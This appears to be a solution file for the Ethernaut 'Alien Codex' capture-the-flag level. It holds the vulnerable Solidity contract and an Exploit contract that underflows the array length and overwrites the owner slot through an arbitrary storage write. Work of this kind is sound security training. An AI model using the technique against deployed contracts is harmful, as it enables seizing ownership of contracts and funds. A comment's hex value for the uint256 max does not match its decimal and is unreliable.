// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

/* 
chisel
type(uint256).max
uint256(0xffffffffffffffffffffffffffffffffffffffffff)
Max array length
Type: uint
Hex: 0xffffffffffffffffffffffffffffffffffffffffff
Decimal: 11579208923751619542357098509867907853269984665640564039457584007913129639935
 */

// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-19-alien-codex
interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Exploit {
    function run() public {
        address targetContractAddress = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

        IAlienCodex alienCodex = IAlienCodex(targetContractAddress);

        // Make contact with the alien codex
        alienCodex.makeContact();

        // Retract the codex length by 1, causing an underflow
        alienCodex.retract();

        // Calculate the index in the array where the owner is stored
        uint256 arraySlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 ownerSlot = 0;
        /* 
        type(uint256).max 
        Member "max" not found or not visible after argument-dependent lookup in tuple().solidity
        Invalid type for argument in function call. Contract type required, but type(uint256) provided.solidity
        */
        // uint256 indexToModify = type(uint256).max - arraySlot + ownerSlot + 1;
        uint256 indexToModify = 2 ** 256 - 1 - arraySlot + ownerSlot + 1;

        // Overwrite the owner with msg.sender
        alienCodex.revise(indexToModify, bytes32(uint256(uint160(msg.sender))));
    }
}

/* 
This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds 
to the entire storage area of 2^256. The user is then able to modify all contract storage.
 */
